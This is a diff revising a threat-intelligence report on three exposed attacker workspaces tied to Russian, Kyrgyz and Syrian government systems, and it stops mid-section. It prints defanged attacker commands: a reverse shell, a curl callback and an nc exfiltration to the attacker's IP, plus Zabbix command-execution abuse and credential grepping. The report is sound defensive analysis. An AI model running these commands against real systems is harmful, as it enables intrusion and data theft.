@@ -1,6 +1,6 @@
 ---
-title: "Three Open Directories Expose Government Targeting and Compromise"
-description: "Three exposed operator workspaces reveal government targeting, confirmed intrusions, stolen data and exploit attempts across Russia, Kyrgyzstan and Syria."
+title: "Russian and Allied Government Systems Compromised: Evidence From Three Exposed Operator Workspaces"
+description: "Three exposed operator workspaces reveal confirmed access to Russian and Kyrgyz government systems, a Syrian Customs C2 inventory, stolen data and further exploitation attempts."
 content_type: research
 canonical_url: https://aabbcvc.github.io/research/government-open-directories/
 categories:
@@ -22,261 +22,481 @@ toc: true
 
 ## Overview
 
-Exposed attacker infrastructure can reveal more than a list of malicious tools. It can preserve the targets an operator selected, the commands they tried, the access they obtained, and the information they collected. Sometimes it also preserves enough failures to show where an intrusion stopped.
+Using Hunt.io's AttackCapture, we identified three exposed operator workspaces linked to Russian, Kyrgyz and Syrian government systems. The directories preserved much more than target lists. They contained stolen application data, command output, malware, C2 records, exploit tools and an interactive shell history.
 
-Three open directories identified by Hunt.io offer that view into activity involving Russia’s Ministry of Emergency Situations, Kyrgyzstan’s Ministry of Foreign Affairs and national security service, and a historical C2 inventory associated with Syrian Customs. The collections contain very different evidence: administrative API responses and stolen business data, implant and command-output records, and a shell history dominated by exploitation attempts.
+The evidence supports three different outcomes:
 
-The distinction matters. A government hostname in a target list establishes interest. Returned command output supports execution. A database dump establishes collection. Those are different outcomes, and the directories should not be treated as three equally successful government breaches.
+- **Confirmed application compromise:** A roleless account accessed protected administrative data in the Atlas platform used by Russia's Ministry of Emergency Situations, or MChS, and changed application state.
+- **Confirmed server execution:** Uploaded PHP ran as `www-data` on a Kyrgyz Ministry of Foreign Affairs, or MFA, web host. VShell-compatible agents later ran from `/tmp`.
+- **Reported historical C2 access:** A separate database recorded Syrian Customs hostnames and privileged account contexts, but did not preserve the original intrusion path or host-specific commands.
+- **Repeated targeting without proof of success:** A third workspace repeatedly targeted Kyrgyzstan's national security webmail and Russian systems with public exploits and supplied credentials.
 
-Hunt.io’s AttackCapture records establish the following first-observation dates:
+Hunt.io first observed the open directories on these dates:
 
-| Exposed directory | First observed by Hunt.io | Principal government-related evidence |
+| Exposed directory | First observed by Hunt.io | Strongest government-related evidence |
 |---|---|---|
-| `45.151.139[.]249:8765` | 30 August 2026 | MChS Atlas access and modification; broader Russian targeting |
-| `207.148.64[.]94:8083` | 30 August 2026 | Kyrgyz MFA execution records; separate Syrian Customs-associated C2 inventory |
-| `89.124.123[.]216:8080` | 16 June 2026 | Repeated attempts against Kyrgyz national security webmail and Russian targets |
+| `45.151.139[.]249:8765` | 30 August 2026 | MChS Atlas administrative access and state changes |
+| `207.148.64[.]94:8083` | 30 August 2026 | Kyrgyz MFA command execution and implants; separate Syrian Customs C2 inventory |
+| `89.124.123[.]216:8080` | 16 June 2026 | Repeated exploit attempts against GKNB webmail and Russian targets |
 
-These dates describe when Hunt.io first observed the exposed directories, not when the attacks began. The local collections include material from different times, and file-copy dates are not reliable infection timestamps. No evidence establishes a common operator across all three workspaces.
+These are discovery dates for the exposed infrastructure. They are not the start dates of the intrusions.
 
-One further limitation is material: the MFA collection contains testing, replay and investigation markers. Its captured technical behavior can be described, but its provenance does not support presenting every action as an independently verified hostile operation. The Syrian records also require separate treatment within that collection.
+We also found no evidence that all three directories belonged to one operator. Each workspace has a different evidence standard, so we assess success at the specific system or resource reached.
 
-## 1. MChS Atlas and Russian Commercial Networks — `45.151.139[.]249:8765`
+## 1. Russia: MChS Atlas Access and Commercial Data Theft
 
-The first directory combined focused government targeting with a much broader search for exposed services. Its local analysis covered 1,195 original files, including scripts, reconnaissance output, API responses, binaries, SQL dumps and audio. The target census contained more than 5.2 million unique IP addresses. That scale describes the discovery corpus; it is not a count of victims or proof that every address received an exploit.
+The first open directory exposed a broad offensive workspace. It contained 1,195 original files and a discovery corpus of more than 5.2 million unique IP addresses.
 
-Within that corpus, Russia’s Ministry of Emergency Situations—MChS, also known as EMERCOM—received deliberate attention. The operator shortlisted 18 ministry-related domains and 18 public IP addresses. Targets included Atlas mapping services, authentication portals, emergency-dispatch systems, file-sharing services and administrative interfaces.
+That scale reflects Internet-wide collection, not 5.2 million attacks or victims. Inside it, however, MChS received focused attention:
 
-The strongest government compromise evidence concerned **Atlas**, where an operator-controlled account obtained administrative information and changed application state despite having no administrator role.
+- 18 ministry-related domains were shortlisted.
+- 18 public IP addresses were selected.
+- Targets included mapping, authentication, dispatch, file-sharing and administrative services.
+- The strongest result came from Atlas, an emergency-management mapping platform.
 
-### A non-admin account with administrative visibility
+### A roleless Atlas account reached administrative data
 
-The retained Atlas profile described a “Test Operator” account. Selected fields show the important distinction:
+The retained profile identified a "Test Operator" account with no assigned roles or additional permissions:
 
 ```json
 {
   "isAdmin": false,
-  "isSuperUser": false
+  "isSuperUser": false,
+  "roles": [],
+  "additionalPermissions": []
 }
 ```
 
-The same profile had no assigned roles or additional permissions. Nevertheless, the account received data from 15 of 29 probed administrative endpoints. Returned information covered roles, permissions, object forms, categories, import definitions, metrics, regions, external connections and Web Map Service configuration.
+Despite that state, 15 of 29 administrative probes returned data. The operator could read roles, permissions, forms, categories, import definitions, metrics, regions, map-service settings and external connections.
 
-The clearest inconsistency appeared between related routes. Direct role and permission requests returned `403` responses, while corresponding `/search` routes returned role records and permission definitions. This supports broken authorization at the application-function level: restrictions were enforced on some paths but did not consistently protect equivalent information elsewhere.
+The route behaviour showed inconsistent authorisation:
 
-The scripts also supplied `X-Closed-Network: true` in some requests. That shows an attempt to invoke behavior intended for an internal context. The available evidence does not establish that this header caused the authorization failure.
+- Direct role and permission routes returned `403`.
+- Parallel `/search` routes returned the protected records.
+- Some requests added `X-Closed-Network: true`, apparently to claim an internal-network context.
+- The retained evidence does not prove that the header alone caused the bypass.
 
-The operator progressed from reading data to changing state. At **19:19:41 +03 on 27 August 2026**, Atlas recorded a newly created external connection named `SSRF Test`. An existing Greenplum connection showed an update 51 seconds later and appeared as `Greenplum_revealed`. The timing and naming support an association with the operator, although the original modifying request and previous values are missing.
+### Samples of the stolen ATLAS data
 
-A separate sequence of WMS snapshots showed six layers, then seven including a published `Test WMS` layer, then six again. The temporary layer pointed to an out-of-band callback service. A retained response obtained through the Atlas tile proxy confirmed a server-side fetch to that service.
+The Atlas theft was primarily a loss of operational structure, configuration and credentials. It was not a complete export of live emergency records.
 
-This was meaningful application compromise: unauthorized administrative access, configuration changes and a demonstrated server-side request. It did not establish an operating-system shell, successful administrator promotion, or access to internal services or cloud metadata through that request mechanism.
+The stolen category hierarchy contained 455 retained nodes. Of these, 396 were marked `authorizedOnly: true`.
 
-### What was collected from the government platform?
+| Stolen Atlas category | Retained nodes | What it describes |
+|---|---:|---|
+| Situation monitoring | 210 | Layers used to track emergency conditions, hazards and response activity |
+| Territorial bodies of MChS Russia | 188 | How ministry responsibilities and map content are divided across regional bodies |
+| External sources | 18 | Data supplied by systems outside Atlas |
+| Orthophotomaps | 13 | Aerial or satellite-derived map layers |
+| MChS data | 9 | Ministry-owned information sources and operational layers |
+| Monitoring | 7 | Environmental or infrastructure monitoring categories |
 
-The retained Atlas material was rich in configuration and structure. It included a category hierarchy covering emergency-response resources, flood and wildfire risks, hazardous facilities, dispatch services and other civil-protection functions. The analysis counted 455 retained category nodes, 396 marked `authorizedOnly: true`.
+The retained form schemas show the types of information Atlas was designed to hold:
 
-The operator also obtained nine Kafka import definitions. These exposed topic and schema names, field mappings, integration endpoints and operational counters. Two definitions contained reusable authentication-token values in their headers. Those secrets are excluded here.
+- **Dispatch services:** communications equipment, radio, satellite and Internet channels, address and region.
+- **Temporary accommodation points:** institution name, address, phone number and capacity.
+- **Education facilities:** occupancy, fire resistance, alarms, resources and daytime or night-time population.
+- **Wildfire-exposed settlements:** municipality and settlement names.
+- **Hazardous road sections:** road name, kilometre marker, length, capacity and description.
+- **Airports:** municipality, location, characteristics, weather and major incidents.
+- **Civil-defence authorities:** authority name, address, public phone number and email address.
 
-The distinction between structure and underlying records is essential. Counters in the import definitions totalled approximately 3.74 million; they do not demonstrate theft of 3.74 million records. Similarly, the category tree described map layers without proving that their full contents or geometry were downloaded.
+Only 12 of a reported 1,059 forms were retained. These were schemas, not populated object rows. They reveal what Atlas collects and how responders use it, but they do not prove theft of every facility or contact record.
 
-The collection held approximately 2.39 MB of Atlas JSON and 46 downloaded PNG attachments totalling 41.3 MB. The images were largely regional coats of arms, hazard symbols and map icons. Several API results were paginated or partial. The supported finding is administrative and operational-configuration disclosure, including integration secrets, rather than a complete emergency-management database dump.
+The operator also obtained all nine returned Kafka import definitions:
 
-Other ministry targets produced weaker results. File-sharing requests remained unauthenticated or returned `401`; emergency-dispatch attempts were rate-limited or rejected; account-elevation attempts did not produce a retained administrator session. Atlas should therefore be identified as the demonstrated application compromise, without extending that conclusion to all shortlisted MChS systems.
+| Data feed | Topic or schema name | State | Counter |
+|---|---|---|---:|
+| Road accidents | `gibdd_dtp` | work | 928,826 |
+| Ministry of Health incidents | `vsodchs` | work | 12,584 |
+| MChS emergencies | `wiki_chs_data` | work | 14,182 |
+| Water incidents | `gims_drown_request` | work | 9,189 |
+| Fire danger classes | `rosgidromet_kpo_forecast_inline` | stop | 1,234,168 |
+| Fire-danger forecast | `rosgidromet_ppo_forecast_inline` | stop | 824,746 |
+| Groundwater monitoring | `geomonitoring_groundwater` | stop | 386,234 |
+| Thermal hotspots | `kaskad_thermopoints` | stop | 178,972 |
+| Utilities accidents | `gkh_accidents` | stop | 153,763 |
 
-### The commercial branch reached deeper into a network
+Together, those counters total about 3.74 million. They are application counters, not a verified count of exfiltrated records.
 
-The same workspace contained stronger evidence of operating-system execution and business-data theft at **Union Travel**. A Zabbix service at `85.95.166[.]40:8080` accepted default credentials. The operator used its script-management functionality to execute commands.
+The import objects disclosed:
 
-Two calls in the retained automation show the mechanism; variable values are omitted:
+- Topic and schema names.
+- Field mappings for coordinates and external IDs.
+- Linked form identifiers.
+- Start and stop timestamps.
+- External integration endpoints.
+- Two non-empty `X-AUTH-TOKEN` values in active integrations.
+
+We have withheld the tokens. They are the most immediately useful stolen items because they could provide access to connected services after the Atlas flaw is fixed.
+
+Other stolen administrative data included:
+
+- 15 of 20 roles, including regional operators, a moderator and a super-user role.
+- 100 permission definitions for users, roles, tokens, Kafka imports, WMS, external databases and layer import or export.
+- 20 of 45 environmental metric definitions.
+- 97 region nodes covering eight federal districts and 89 child regions.
+- Six legitimate WMS layer configurations and one temporary test layer.
+- 46 PNG attachments totalling 41.3 MB, mostly regional emblems and hazard or map icons.
+
+The files gave the operator a working blueprint of Atlas: its protected data catalogue, administrative model, regional organisation, integrations and map-service plumbing.
+
+> **Suggested screenshot:** A redacted composite showing the roleless profile beside the `/roles/search` response and one Kafka import definition. Blur UUIDs and remove all token values.
+
+### The operator changed Atlas state
+
+At 19:19:41 +03 on 27 August 2026, a new external connection named `SSRF Test` appeared. An existing Greenplum connection was updated 51 seconds later and displayed as `Greenplum_revealed`.
+
+A second snapshot sequence showed:
+
+- Six legitimate WMS layers.
+- Seven layers after a published `Test WMS` entry appeared.
+- Six layers again after the test entry disappeared.
+
+The test layer pointed to an out-of-band callback service. A response collected through the Atlas tile proxy confirmed that the server fetched the operator-controlled URL.
+
+This supports unauthorised administrative reads, configuration changes and a demonstrated server-side request. It does not prove an operating-system shell, administrator promotion or access to cloud metadata.
+
+> **Suggested screenshot:** The three WMS snapshots in sequence, with the callback identifier redacted, plus the timestamped `SSRF Test` connection object.
+
+### Union Travel: from default credentials to a private network
+
+The same workspace contained stronger operating-system and data-theft evidence at Russian travel company Union Travel.
+
+A Zabbix instance at `85.95.166[.]40:8080` accepted its documented default administrator credentials. The operator abused Zabbix's script functions:
 
 ```python
 api("script.update", {"scriptid": sid, "command": cmd}, token)
-api("script.execute", {"scriptid": sid, "hostid": hostid}, token, timeout=25)
+api("script.execute", {"scriptid": sid, "hostid": hostid}, token)
 ```
 
-Correlated transfer and tunnel logs then show `chisel` downloaded at 21:45:37 on 29 August, a reverse SOCKS tunnel established three seconds later, and `fscan` downloaded at 21:47:11. These times are recorded in logs without a verified timezone. The tunnel log includes:
+The retained automation shows hands-on post-exploitation commands. These examples are shortened and defanged:
 
-```text
-2026/08/29 21:45:40 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```bash
+for p in 22 80 443 445 3389 3306 8080 5432; do
+  (echo >/dev/tcp/192.168.115.20/$p) 2>/dev/null && echo "OPEN:$p"
+done
+
+find / -name 'zabbix.conf.php' 2>/dev/null | head -3
+cat /var/www/html/zabbix/conf/zabbix.conf.php 2>/dev/null | grep -E 'DB_|USER|HOST'
 ```
 
-Chisel provided a route into the private network; fscan performed internal discovery. The resulting scan of `192.168.115.0/24` identified `office.union-travel.ru` and a mixture of workstations, servers, cameras, printers, telephony devices and other services.
+Transfer and tunnel logs recorded the next steps:
 
-Four SQL dumps in the workspace contained **406,654 inserted rows**, totalling **133.6 MB**. They covered customers, tourists, ticketing, employee or application accounts, and call-detail records. Rows are not unique people. Seven MP3 artifacts, representing six distinct file hashes, were consistent with call recordings.
+- `chisel` was downloaded at 21:45:37 on 29 August 2026.
+- A reverse SOCKS tunnel was listening three seconds later.
+- `fscan` was downloaded at 21:47:11.
+- The operator scanned `192.168.115.0/24`.
+- The scan recorded 914 checks and 95 open ports.
 
-The business-specific contents, internal hostname and tunnel chronology strongly support collection from this environment. The exact database-export command is absent, so the final extraction step cannot be reconstructed directly.
+Internal results identified `office.union-travel.ru`, named workstations, cameras, printers, SIP devices, databases, file-transfer services and Windows systems.
 
-### Public tools, weak credentials and opportunistic expansion
+The operator then collected call audio. A retained command shows the transfer pattern:
 
-This operation relied heavily on accessible management functions and public tools. Chisel supplied tunnelling, fscan supplied internal discovery, and custom scripts handled authentication, API access and collection. No distinct custom malware family, ransomware or wiper was identified.
+```bash
+curl -sk 'hxxps://192.168.115.25/<date>/<recording>.mp3' |
+  base64 | nc -w 5 45.151.139[.]249 9191
+```
 
-Additional evidence included a Jenkins execution-and-tunnel chain, anonymous Confluence document collection, and Docker API access that exposed container configuration and secrets. Redis configuration writes staged cron-style callbacks on 15 hosts, but the retained callback log did not establish their execution. An etcd/Patroni configuration change similarly staged a malicious `archive_command` without showing that PostgreSQL executed it.
+The open directory held four SQL dumps totalling 133.6 MB:
 
-The toolkit referenced numerous CVEs, including **CVE-2024-4577** for PHP-CGI, **CVE-2024-3400** for PAN-OS, **CVE-2021-4034** for PwnKit and **CVE-2021-3156** for Baron Samedit. Their presence establishes exploit capability or intended use. The proven Atlas authorization failure and Zabbix default-credential chain cannot be assigned to those CVEs.
+- `cdr.sql`: 297,941 rows of call time, caller and callee identifiers, routing, duration, disposition, remote IP and recording filename.
+- `clients.sql`: 6,784 rows containing client names, countries, phone numbers and legal-entity links.
+- `tickets.sql`: 34,975 rows containing tickets, routes, payment context, prices, commissions, offices, managers and comments.
+- `tourists.sql`: 66,954 rows containing names, dates of birth, sex, email addresses, phone numbers, employers, tax identifiers and addresses.
 
-The distinction explains the operation’s success: the clearest gains came from inconsistent authorization, weak credentials and exposed administrative interfaces. A large exploit library was present, but it was not necessary to explain the most consequential observed outcomes.
+The `user` table also contained password and authentication-key fields. We have not reproduced them.
 
-Ukrainian-language comments and concentrated Russian targeting provide language and targeting context. They do not establish a specific group, nationality or state sponsor.
+Seven MP3 files represented six unique recordings. This confirms customer and employee data theft, call metadata collection and audio exfiltration.
 
-## 2. Kyrgyz MFA and the Syrian Customs Inventory — `207.148.64[.]94:8083`
+### Tooling and success
 
-The second directory exposed a C2-related working collection containing Linux payloads, command responses, transport diagnostics and a saved database. Hunt.io’s directory listing corroborates the presence of the distinctive operation and bridge directories, along with `db.original/`.
+This workspace favoured simple, repeatable tools:
 
-Two evidence sets need to remain separate. The first documents code execution on a host presented as the Kyrgyz Ministry of Foreign Affairs website. The second is a historical C2 inventory containing Syrian Customs-associated hostnames. Shared storage and compatible tooling do not establish that these were one continuous campaign.
+- `chisel` for reverse tunnels and SOCKS access.
+- `fscan`, Masscan and Nmap for discovery.
+- Zabbix scripts and Jenkins jobs for command execution.
+- Redis cron and Patroni configuration changes for further access attempts.
+- Short Python, shell and JavaScript programs tailored to individual services.
 
-### An image upload became a route to command execution
+We found no ransomware, wiper or custom malware family in this collection. The pattern was discovery, weak credentials or exposed administration, command execution, tunnelling, internal discovery and data collection.
 
-The recorded MFA workflow began with an **existing authenticated backend session**. It obtained a CSRF token, submitted a small GIF image containing PHP through an embassy-image upload field, located the resulting public `.php` file and requested it.
+## 2. Kyrgyz MFA Compromise and a Syrian Customs C2 Inventory
 
-This type of file is often called a polyglot: it contains material interpretable in more than one format. Here, image content remained at the start of the response while PHP execution produced command output. A retained response contains:
+The second directory contained the clearest government server compromise.
+
+The first successful proof was timestamped 28 August 2026 at 16:29:16 UTC. It used an existing authenticated MFA backend session to upload a one-pixel GIF containing PHP through an embassy-image field.
+
+The application gave the file a random name under `/uploads/embassies/`. Requesting the resulting `.php` path returned:
 
 ```text
-[43-byte GIF prefix omitted]
+[GIF prefix omitted]
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
 __ID_EXIT_CODE__=0
 ```
 
-The first supplied successful proof is timestamped **28 August 2026 at 16:29:16 UTC**. Repeated captures identify the Linux host as `mfa`, with private address `10.51.6.93`, and execution under the web-service account `www-data`.
+This confirms command execution as the web-service account on a host named `mfa`, with private address `10.51.6.93`.
 
-The demonstrated weakness was executable file upload through an authenticated application workflow. No defensible CVE assignment is available. The collection also does not establish how the initial backend session was acquired. An anonymous error response exposing internal application details is not evidence that authentication was bypassed.
+The weakness is best described as authenticated executable file upload, consistent with CWE-434. The evidence does not support a specific CVE, and it does not show how the initial backend session was acquired.
 
-The embassy upload directory identifies the application feature used. It does not mean that overseas embassies were independently compromised.
+### What happened after execution
 
-### VShell-compatible implants and a web-based transport
+The records show methodical post-exploitation from the web context.
 
-The operator initially tried a reverse-stage approach, but captures show errors and connectivity failures. The workflow then shifted to full Linux agents listening on the MFA host, first on port 8085 and then on 8086.
+Only `id` is preserved verbatim as the command in the proof metadata. The longer one-shot payloads are missing, so we do not present reconstructed shell syntax as exact keyboard input. Their returned output still proves the following actions:
 
-Two disk-backed payloads are tied to victim-side hashes, processes and socket evidence. The analysis identifies them with high confidence as **VShell or directly compatible builds**. The C2 log reports server/core version `4.9.3`; that version was not independently recovered from every binary.
+- Enumerated the default route and local `10.51.6.64/27` network.
+- Checked for `curl`, `wget` and `nc`.
+- Read `.env`, `.env.local`, `.env.test`, `services.yaml` and Git metadata.
+- Read Yii and Symfony configuration.
+- Recovered database, application, API, cookie-signing and JWT-related secrets.
+- Queried local PostgreSQL as user `utn`.
+- Listed public tables, database roles and `plpgsql`.
+- Enumerated SUID files, sudo behaviour, services, cron directories, timers and root-owned processes.
+- Inspected Bitdefender and Puppet components.
+- Tested SSH, Redis, PostgreSQL and MySQL credentials against internal systems.
+- Probed internal web applications and framework debug paths.
 
-The confirmed implant paths were:
+A network-diagnostic response included:
+
+```text
+default via 10.51.6.65 dev ens192
+10.51.6.64/27 dev ens192 scope link src 10.51.6.93
+```
+
+A local PostgreSQL session returned `current_user=utn`, `current_database=utn` and PostgreSQL 15.3. Visible tables included:
+
+- `person_info`
+- `organization`
+- `document`
+- `accident_record`
+- `labour_dispute_record`
+- Building, facility, device, ship, resolution and inspection tables
+
+This proves database access and schema visibility. The collection does not contain rows extracted from those business tables.
+
+The operator also listed a pre-existing `mfafront1.zip` archive of about 16 GB. A directory listing is not proof that the archive was created or downloaded.
+
+### VShell agents and a web-based relay
+
+The operator's first reverse-stage attempts failed with connectivity errors. The workflow changed to full Linux agents listening locally on the MFA host.
+
+Two VShell-compatible payloads were confirmed by victim-side hashes, processes and sockets:
 
 ```text
 /tmp/.mfa-vshell-forward-8085
 /tmp/.mfa-vshell-forward-8086
 ```
 
-To carry traffic over the reachable website, the recorded operation used PHP endpoints under `/uploads/embassies/`, a Python helper and a Unix-domain socket. The reconstructed transport was:
+Traffic moved through a custom relay:
 
 ```text
-C2 service / SOCKS frontend
-    → local TCP-to-HTTPS adapter
-    → PHP endpoint on the MFA website
-    → Unix socket and Python helper
-    → local VShell-compatible agent
+C2 service and SOCKS frontend
+  -> local TCP-to-HTTPS adapter
+  -> token-protected PHP endpoint on the MFA website
+  -> Unix socket and Python bridge
+  -> VShell-compatible agent on 127.0.0.1:8086
 ```
 
-This is the collection’s most distinctive technical feature: adaptation to connectivity constraints by transporting implant traffic through the compromised application. Repeated revisions and reconnect attempts also show that the arrangement was unstable. Agent presence and working command exchanges are evidenced; reliable persistence across reboot is not.
+The victim-side components included:
 
-A separate 9,800-byte C loader was present and served for download. Static analysis showed that it could retrieve a stage from `207.148.64[.]94:8084`, XOR-decode it with `0x99`, place it in a memory-backed file using `memfd_create`, and execute it with `fexecve` under the name `[kworker/0:2]`. Those are loader capabilities. Successful execution of that memory-loaded stage on the MFA host was not demonstrated.
+- Four PHP relay endpoints under `/uploads/embassies/`.
+- `/tmp/.mfa_target_forward_bridge.py`.
+- `/tmp/.mfa_forward_bridge_8086.sock`.
+- Local and public SOCKS or adapter ports.
+- Repeated reconnect and recovery attempts.
 
-### Secrets were collected; wider compromise remains unproven
+This was an adaptive workaround for failed direct C2. It provided continuing access through the already reachable web application. The records do not prove persistence across a reboot or root access.
 
-From the web-service account, the recorded activity accessed application configuration, source excerpts, Git history and credentials. Material came from both the MFA application and a co-hosted UTN application. Exposed categories included database credentials, application and API secrets, cookie-validation keys, JWT-related material, and credentials for government integrations.
+A separate 9,800-byte C loader was also staged. Static analysis showed it could:
 
-A local PostgreSQL session authenticated as `utn` and returned schema and role metadata. Table names included `person_info`, `organization`, `document`, `accident_record` and inspection-related records. This demonstrates database access and visibility into its structure. The collection does not contain extracted business rows from those tables.
+- Connect to `207.148.64[.]94:8084`.
+- Receive an XOR-encoded stage using key `0x99`.
+- Create a memory-backed file with `memfd_create`.
+- Execute the stage with `fexecve`.
+- Masquerade as `[kworker/0:2]`.
 
-A roughly 16 GB archive named `mfafront1.zip` appeared in a directory listing. Its presence does not establish that the operator created or downloaded it. It should not be counted as 16 GB of stolen MFA data.
+Those are confirmed capabilities of the file. Successful execution of that loader on MFA was not demonstrated.
 
-The operator probed all 30 usable addresses in `10.51.6.64/27`, inspecting cloud-storage, notification, document-editing, licensing, vehicle-inspection and construction-expertise services. The visible activity included credential reuse, route discovery, exposed documentation and framework-specific tests.
+> **Suggested screenshot:** A redacted MFA proof response beside the two confirmed implant paths and a simple diagram of the PHP to Unix-socket to VShell relay.
 
-Many follow-on attempts failed. A retained SSH verification summary reported 198 attempts and zero successes; a PostgreSQL reuse summary reported 40 attempts and zero successes. Other captures show authentication denials, source-access restrictions and timeouts. Local privilege checks did not demonstrate a root shell on MFA.
+### Lateral movement was broad but unsuccessful
 
-Laravel Ignition probing reached a debug/solution handler on an internal notification application, but did not demonstrate command execution. It should not be labelled successful **CVE-2021-3129** exploitation: the recorded framework/package context differed from the older affected stack, and no completed exploit chain was retained. An unsigned-JWT test that changed an error response from `403` to `500` likewise did not prove an authentication bypass.
+The operator probed all 30 usable addresses in the local `/27`. Targets included storage, notification, document editing, licensing, vehicle inspection and construction services.
 
-The defensible outcome is substantial access to one recorded web host, deployment of two verified agent variants, collection of secrets and configuration, and extensive internal reconnaissance. Successful takeover of the additional Kyrgyz systems remains unproven.
+The supplied outcomes show clear limits:
 
-### What the Syrian Customs records establish
+- SSH verification: 198 attempts, zero successes.
+- PostgreSQL reuse: 40 attempts, zero successes.
+- Redis tests: authentication required or wrong password.
+- MySQL tests: authentication denied.
+- `sudo`: password required.
+- SUID and Bitdefender checks: no privilege-escalation marker created.
+- Laravel Ignition handler: debug behaviour reached, command execution unproven.
+- Unsigned JWT test: response changed from `403` to `500`, no authenticated access returned.
 
-The original C2 database contained **98 registrations representing 31 distinct hostname/IP pairs**. Five hostnames explicitly used `customs.gov.sy`, including `asyapp1`, `asyw-db1`, `asyw-db2`, `backup-01` and `oemcc`.
+The Kyrgyz MFA host was compromised. Wider takeover of the ministry network is not demonstrated.
 
-Adjacent entries described virtualization, storage, monitoring, collaboration, ERP and Windows systems. Reported account contexts included `root`, `oracle`, `vsphere-ui` and `NT AUTHORITY\SYSTEM`. If authentic, the inventory is consistent with broad infrastructure access in a Customs-associated environment.
+### What the Syrian Customs records show
 
-These are self-reported agent identities, however, without the original exploitation chain, host-specific command history or independently verified compromise dates. Repeated registrations account for much of the database: two Windows identities alone contribute 60 rows. Ninety-eight registrations must not become 98 victims in the narrative.
+A separate historical C2 database in the same directory contained 98 registrations representing 31 distinct hostname and IP pairs.
 
-The database also includes a probable test or analysis host, `PETER-PC`. Elsewhere, the collection contains `ctf` paths, a `test-virtual-machine`, probe labels and replay diagnostics. These markers leave the operational provenance unresolved. They do not erase the technical evidence, but they prevent a confident assertion that the entire collection represents one hostile actor compromising two governments.
+Five hostnames explicitly used `customs.gov.sy`:
 
-No Syrian Customs business-data dump or verified theft volume is supplied. Reported C2 access is the strongest available evidence for that cluster.
+- `asyapp1`
+- `asyw-db1`
+- `asyw-db2`
+- `backup-01`
+- `oemcc`
 
-## 3. Kyrgyz National Security Webmail and Russian Targets — `89.124.123[.]216:8080`
+Nearby records described virtualisation, storage, monitoring, collaboration, ERP and Windows systems. Reported account contexts included `root`, `oracle`, `vsphere-ui` and `NT AUTHORITY\SYSTEM`.
 
-The third directory was first observed on **16 June 2026**, earlier than the two August exposures. Its 146-line shell history provides a view of interactive exploitation: cloning public repositories, installing dependencies, editing scripts, starting listeners and repeatedly changing payloads.
+If authentic, the records are consistent with broad privileged access in a Syrian Customs environment. The limitations are substantial:
 
-Its most persistent government target was `mail.gknb.gov[.]kg`, associated with Kyrgyzstan’s State Committee for National Security, or GKNB. The operator repeatedly attempted to exploit its Roundcube webmail service using account credentials supplied on the command line.
+- The database contains self-reported agent identities.
+- It lacks the original exploitation chain.
+- It lacks host-specific terminal history.
+- Repeated registrations inflate the row count.
+- Two Windows identities account for 60 of 98 records.
+- A probable test or analysis host named `PETER-PC` appears in the inventory.
+- The surrounding collection contains `ctf`, test and replay markers.
 
-Unlike the preceding collections, this workspace lacks retained target responses, successful shell transcripts or collected victim data. It documents deliberate targeting and exploitation attempts, with no confirmed compromise.
+No Syrian Customs business-data dump or verified exfiltration volume was supplied. We treat this as a historical C2 inventory associated with Syrian Customs, rather than 98 proven victim systems.
 
-### Repeated credential-supplied Roundcube attempts
+## 3. Kyrgyz National Security and Russian Targets
 
-The operator used public proof-of-concept implementations for **CVE-2025-49113**, a post-authentication remote-code-execution vulnerability involving PHP object deserialization. Roundcube addressed the issue in its June 2025 security releases, versions 1.6.11 and 1.5.10. That advisory establishes the vulnerability’s behavior, not whether the targeted installations were vulnerable. [Roundcube security announcement](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10).
+Hunt.io first observed the third open directory at `89.124.123[.]216:8080` on 16 June 2026.
 
-For GKNB, the history contains identity-discovery commands, netcat and shell callbacks, base64-wrapped variants and HTTP callbacks intended to carry encoded command output. A sanitized example preserves the attempted invocation while removing credentials and disabling the target URL:
+Its 146-line `.bash_history` captured a hands-on operator:
 
-```text
-php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail <ACCOUNT> <PASSWORD> "whoami"
+- Cloning public exploit repositories.
+- Installing PHP and Python dependencies.
+- Editing exploit scripts.
+- Building a malicious upgrade archive.
+- Starting netcat listeners.
+- Retrying callbacks with different syntax.
+- Moving between unrelated products and targets.
+
+The most persistent government target was `mail.gknb.gov[.]kg`, associated with Kyrgyzstan's State Committee for National Security, or GKNB.
+
+No target responses, successful shell transcripts or stolen files were retained. This workspace proves targeting and attempted exploitation, not compromise.
+
+### Roundcube CVE-2025-49113 attempts
+
+The operator used two public proof-of-concept implementations for CVE-2025-49113, a post-authentication Roundcube remote-code-execution vulnerability involving PHP object deserialisation.
+
+Credentials were supplied on the command line. We removed them from these examples:
+
+```bash
+php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
+  <ACCOUNT> <PASSWORD> "whoami"
+
+php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
+  <ACCOUNT> <PASSWORD> \
+  "curl hxxp://89.124.123[.]216:8080/$(id | base64 -w0)"
+
+php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
+  <ACCOUNT> <PASSWORD> \
+  "bash -i >& /dev/tcp/89.124.123[.]216/443 0>&1"
 ```
 
-The repeated changes show an operator trying to obtain or validate execution. They do not establish that a callback arrived. Even the validity of the supplied credentials remains unconfirmed because authentication results are absent.
+These are exact command patterns from the shell history with credentials removed and network indicators defanged.
 
-Three other mail hosts appeared in credential-supplied Roundcube attempts: `mail.aca.cfuv[.]ru`, `mail.aviel[.]ru` and `mail.rcz-dnr[.]ru`. Commands aimed at the first included an attempt to read `/etc/shadow`; other attempts sought identity output or a reverse shell. The captured history reveals those objectives without proving the requested information was obtained.
+The operator tried:
 
-### A wider collection of exploit tracks
+- `whoami` and `id` to confirm execution.
+- Netcat callbacks on ports 443, 8080 and 8081.
+- Bash `/dev/tcp` reverse shells.
+- Base64-wrapped commands.
+- HTTP callbacks carrying encoded command output.
 
-The operator moved between webmail, edge appliances, databases and web applications. The workspace included the following tracks:
+Three Russian-language or Russian-linked mail hosts also appeared. One attempt requested `cat /etc/shadow`; others requested `whoami` or a reverse shell.
 
-| Vulnerability or mechanism | Evidence in the directory | Supported outcome |
+None of the commands has a retained success response. Even the validity of the supplied credentials cannot be confirmed from this directory.
+
+> **Suggested screenshot:** A short extract of the shell history showing the progression from `whoami` to encoded callbacks and reverse shells. Redact every username and password.
+
+### Other exploit tracks
+
+The operator moved quickly between public vulnerabilities and exposed services:
+
